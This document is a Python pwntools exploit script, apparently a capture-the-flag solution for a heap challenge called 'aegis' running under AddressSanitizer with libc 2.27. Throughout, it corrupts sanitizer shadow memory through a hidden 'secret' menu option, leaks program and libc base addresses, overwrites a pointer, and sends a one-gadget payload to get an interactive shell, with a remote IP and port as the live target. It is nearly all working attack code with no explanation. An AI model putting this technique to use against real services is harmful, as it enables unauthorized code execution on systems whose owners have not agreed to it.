from pwn import *

debug=1
#context.log_level='debug'
context.log_level = 'debug'
context.terminal = ['notiterm', '-t', 'iterm', '-p','15112','-e']
context.terminal = ['notiterm', '-t', 'iterm', '-p', '15112', '-e'] # use 50806 port as an example

if debug:
    p=process('./aegis',env={'LD_PRELOAD':'./libc-2.27.so'})
    gdb.attach(p)
else:
    p=remote('111.186.63.209',6666)

def get(x):
    return p.recvuntil(x)
    
def pu(x):
    p.send(x)

def pu_enter(x):
    p.sendline(x)

def add(sz,content,id):
    pu_enter('1')
    get('Size')
    pu_enter(str(sz))
    get('Content')
    pu(content)
    get('ID')
    pu_enter(str(id))
    get('Choice: ')

def show(idx):
    pu_enter('2')
    get('Index')
    pu_enter(str(idx))
    

def update(idx,content,id):
    pu_enter('3')
    get('Index')
    pu_enter(str(idx))
    get('Content: ')
    pu(content)
    get('New ID:')
    pu_enter(str(id))
    get('Choice:' )

def delete(idx):
    pu_enter('4')
    get('Index')
    pu_enter(str(idx))
    get('Choice:')

def secret(addr):
    pu_enter('666')
    get('Lucky Number: ')
    pu_enter(str(addr))
    get('Choice:')

add(0x10,'a'*8,0x123456789abcdef)
for i in range(4):
    add(0x10,'b'*0x8,123)

#0x602000000000
#0x7fff8000
secret(0xc047fff8008-4)
update(0,'\x02'*0x12,0x123456789)
update(0,'\x02'*0x10+p64(0x02ffffff00000002)[:7],0x01f000ff1002ff)
delete(0)
#raw_input("#")
add(0x10,p64(0x602000000018),0)
#raw_input("#")
show(0)

get('Content: ')
addr = u64(get('\n')[:-1]+'\x00\x00')
print addr
pbase = addr -0x114AB0
get('Choice: ')

update(5,p64(pbase+0x347DF0)[:2],(pbase+0x347DF0)>>8)
show(0)

get('Content: ')
addr = u64(get('\n')[:-1]+'\x00\x00')
base = addr -0xE4FA0
get('Choice: ')

update(5,p64(pbase+0x0FB08A0),p64(pbase+0x7AE140))
#update(5,p64(pbase+0xfb08a0+0x28),(pbase+0xfb08a0+0x28)>>8)
raw_input("aa")
pu_enter('3')
get('Index')
pu_enter('0')
get('Content')
#raw_input(hex(pbase+0x7AE140))
pu(p64(base+524464)[:7])
#get('ID')
raw_input("#get"+str(hex(pbase+0x7AE140)))
payload = 'a'*471+p64(base+0x4f322)+'\x00'*0x100
#raw_input(hex(base + 0x4f322))
pu_enter(payload)


#print(hex(lbase))
#print(hex(stack))
p.interactive()

